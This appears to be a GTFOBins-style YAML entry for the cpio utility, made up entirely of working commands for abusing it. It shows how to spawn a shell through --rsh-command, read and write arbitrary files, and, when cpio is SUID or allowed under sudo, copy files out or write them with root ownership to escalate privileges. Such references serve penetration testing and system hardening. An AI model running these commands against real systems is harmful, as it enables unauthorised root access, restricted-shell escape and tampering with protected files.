---
functions:
  shell:
    - code: |
        echo '/bin/sh </dev/tty >/dev/tty' >localhost
        cpio -o --rsh-command /bin/sh -F localhost:
  file-read:
    - description: The content of the file is printed to standard output, between the cpio archive format header and footer.
      code: |
        LFILE=file_to_read
        echo "$LFILE" | cpio -o
    - description: The whole directory structure is copied to `$TF`.
      code: |
        LFILE=file_to_read
        TF=$(mktemp -d)
        echo "$LFILE" | cpio -dp $TF
        cat "$TF/$LFILE"
  file-write:
    - description: Copies `$LFILE` to the `$LDIR` directory.
      code: |
        LFILE=file_to_write
        LDIR=where_to_write
        echo DATA >$LFILE
        echo $LFILE | cpio -up $LDIR
  suid:
    - description: The whole directory structure is copied to `$TF`.
      code: |
        LFILE=file_to_read
        TF=$(mktemp -d)
        echo "$LFILE" | ./cpio -R $UID -dp $TF
        cat "$TF/$LFILE"
    - description: Copies `$LFILE` to the `$LDIR` directory.
      code: |
        LFILE=file_to_write
        LDIR=where_to_write
        echo DATA >$LFILE
        echo $LFILE | ./cpio -R 0:0 -p $LDIR
  sudo:
    - code: |
        echo '/bin/sh </dev/tty >/dev/tty' >localhost
        sudo cpio -o --rsh-command /bin/sh -F localhost:
    - description: The whole directory structure is copied to `$TF`.
      code: |
        LFILE=file_to_read
        TF=$(mktemp -d)
        echo "$LFILE" | sudo cpio -R $UID -dp $TF
        cat "$TF/$LFILE"
    - description: Copies `$LFILE` to the `$LDIR` directory.
      code: |
        LFILE=file_to_write
        LDIR=where_to_write
        echo DATA >$LFILE
        echo $LFILE | sudo cpio -R 0:0 -p $LDIR
---
